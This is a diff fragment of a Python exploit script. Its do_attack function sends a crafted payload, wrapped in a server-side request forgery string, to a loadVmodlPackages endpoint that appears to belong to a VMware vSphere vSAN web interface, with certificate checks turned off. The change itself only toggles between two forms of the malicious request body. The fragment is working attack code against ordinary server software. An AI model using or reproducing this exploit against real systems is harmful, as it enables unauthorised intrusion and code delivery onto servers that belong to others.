@@ -108,8 +108,8 @@ class InMemoryZip(object):
 def do_attack(target, payload):
     try:
         url = f"{target}/ui/h5-vsan/rest/proxy/service/vmodlContext/loadVmodlPackages"
-        post_data = {"methodInput": [[pyssrf.format(payload.decode("utf-8"))], True]}
-        # post_data = {"methodInput": [[pyssrf.format(payload.decode("utf-8"))]]}
+        post_data = {"methodInput": [[pyssrf.format(payload.decode("utf-8"))]]}
+        # post_data = {"methodInput": [[pyssrf.format(payload.decode("utf-8"))], True]}
         result = req.post(url=url, headers=headers, data=json.dumps(post_data), verify=False)
         return result
     except requests.exceptions.RequestException as e:
